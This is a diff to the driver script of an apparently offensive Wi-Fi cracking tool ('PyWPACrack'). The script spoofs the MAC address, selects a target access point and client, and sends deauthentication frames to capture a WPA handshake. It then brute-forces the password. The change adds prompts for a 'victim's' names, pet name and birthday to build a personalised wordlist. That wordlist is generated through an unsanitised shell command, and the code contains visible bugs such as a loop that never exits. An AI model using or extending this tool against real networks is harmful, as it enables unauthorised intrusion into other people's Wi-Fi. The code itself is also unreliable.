@@ -1,7 +1,8 @@
 
+from datetime import datetime
+from os import getcwd
 from signal import signal, SIGINT, SIGTSTP
 from time import sleep, perf_counter
-
 from multiprocessing import cpu_count
 
 from core.get_clients import get_aps_recursive, get_clients
@@ -11,7 +12,6 @@ from core.install_drivers import has_connection, upgrade, install_essentials, in
 
 from utils import _get_response, verify_pathdir, get_wordlist, IS_ROOT
 from utils.colorize import colorize, banner
-
 
 def _signal_handler(signal, frame):
     print()
@@ -33,9 +33,12 @@ def _get_iface(ifaces):
         for iface in ifaces:
             print(f"[{count}] {iface['iw_name']}")
             count+=1
-
         try:
-            iface_num=int(input('Por favor, seleccione una interfaz: '))
+            raw=input('Por favor, seleccione una interfaz o enter para reescanear: ').strip()
+            if raw == '':
+                return raw
+
+            iface_num=int(raw)
             iface_name=ifaces[iface_num]['iw_name'].strip()
             return iface_name
         except ValueError:
@@ -50,7 +53,6 @@ def _get_ap(aps):
         for ap in aps:
             print(f"[{count}] {ap['data'][0]}   Crypt: {ap['data'][3]}   Channel: {ap['data'][2]}")
             count+=1
-
         try:
             ap_num=int(input('Por favor, seleccione un AP: '))
             ap_data=aps[ap_num]
@@ -67,7 +69,6 @@ def _get_client(clients):
         for client in clients:
             print(f"[{count}] {client}")
             count+=1
-
         try:
             raw=input('Por favor, seleccione un cliente o enter para reescanear: ').strip()
             if raw == '':
@@ -80,6 +81,16 @@ def _get_client(clients):
             colorize('Por favor, eliga un numero!', level='error', clear=True)
         except IndexError:
             colorize('Por favor, seleccione un Cliente correcto!', level='error', clear=True)
+
+def get_dict_data():
+    first_name=input("[~] Nombres de la victima separados por espacios(Ejp: Bob Toronja): ").lower()
+    last_name=input("[~] Apellidos de la victima separados por espacios: ").lower()
+    nickname=input("[~] Apodo de la victima: ")
+    petname=input("[~] Nombre de mascota de la victima: ")
+    birthday=input("[~] Fecha de compleaños en el formato YYY-MM-DD-YY(Ejemplo: 03-05-2001-01): ")
+    others=input("[~] Otros datos separados por coma(los whitespaces seran ignorados, ejp: messi,faraon,love,shady,raa): ").lower()
+
+    return f"{first_name},{last_name},{nickname},{petname},{birthday},{others}"
 
 def main():
     banner('PyWPACrack', author='D3Crypt3r', version='4.0')
@@ -95,7 +106,10 @@ def main():
             colorize('Se requiere al menos una interfaz de red!', level='error', _exit=True)
         
         global iface_name
-        iface_name=_get_iface(ifaces)
+        iface_name=''
+        while iface_name == '':
+            ifaces=get_iws()
+            iface_name=_get_iface(ifaces)
 
         macchange=_get_response('¿Desea cambiar la MAC por una aleatoria?: ', ['Si', 'No'], 'Eliga una opcion: ').lower()
         if macchange == 'si':
@@ -111,7 +125,7 @@ def main():
         def verify_mode_monitor():
             colorize(f'Poniendo interfaz \'{iface_name}\' en modo monitor!', level='info')
             has_mode_monitor=monitor_mode(iface_name)
-            if not has_mode_monitor[0]:
+            if not has_mode_monitor:
                 not_drivers='null' in has_mode_monitor[1]
                 airmon_bussy='Error -16 likely means your card was set back to station mode by something' in has_mode_monitor[1]
                 colorize(f'Error al intentar poner la NIC {iface_name} en modo monitor!', level='error', _exit=not not_drivers or not airmon_bussy)
@@ -136,6 +150,8 @@ def main():
 
                     else:
                         exit(0)
+            return 0
+            
         verify_mode_monitor()
 
         colorize('Obteniendo APs, por favor espere unos segundos...', level='info')
@@ -153,7 +169,6 @@ def main():
         while mac_client == '':
             colorize(f'Obteniendo clientes de \'{ap_ssid}\' con MAC {ap_bssid}...', level='info')
             clients=get_clients(iface_name, ap_bssid)
-
             mac_client=_get_client(clients)       
 
         path_cap=verify_pathdir()
@@ -164,9 +179,26 @@ def main():
         colorize(f'Capturando 4 way-handshake(cerrar ventana cuando se muestre: WPA handshake: xx:xx:xx:xx:xx:Xx)', level='info')
         capture_data(iface_name, path_cap, ap_channel, ap_bssid)
         deauth(iface_name, ap_bssid, mac_client)
-
         
         path_wordlist=get_wordlist()
+        print(path_wordlist)
+        if path_wordlist.lower().endswith('ruta.'):
+            while True:
+                try:
+                    path_wordlist=input("[~] Escribe tu propia ruta: ")
+                except FileExistsError:
+                    colorize("La ruta no existe!", level='error', clear=True)          
+
+        elif path_wordlist.lower().endswith('jsdictor.'):
+            data=get_dict_data()
+            _min=_get_response("Opciones disponibles", range(2,12),"Elija minimo longitud contraseña: ")
+            _max=_get_response("Opciones disponibles", range(2,12),"Elija maximo longitud contraseña: ")
+            repeater=_get_response("Opciones disponibles", range(2,6),"¿Cuantas veces quiere combinar las palabras dadas? ")
+            _path=f'{getcwd()}/dictjs{datetime.now().strftime("%Y_%M_%d__%M_%S")}.txt'
+            cmd=f"./jsdictor -d {data} -m {_min} -M {_max} -R {repeater} -o {_path} -s"
+            system(cmd)
+            path_wordlist=_path
+
         num_passwords=len(open(path_wordlist).read().splitlines())
         start_crack=perf_counter()
         colorize(f'Iniciando crackeo con {num_passwords} contraseñas, usando {cpu_count()} nucleos...', level='info')
@@ -181,7 +213,8 @@ def main():
     except Exception as e:
         colorize(f"Restaurando NIC '{iface_name}' a modo managed e iniciando NetworkManager.", level='info')
         managed_mode(iface_name)
-        colorize(repr(e), level='error', _exit=True)
+        colorize(repr(e), level='error')
+        raise e
 
 if __name__ == '__main__':
     main()
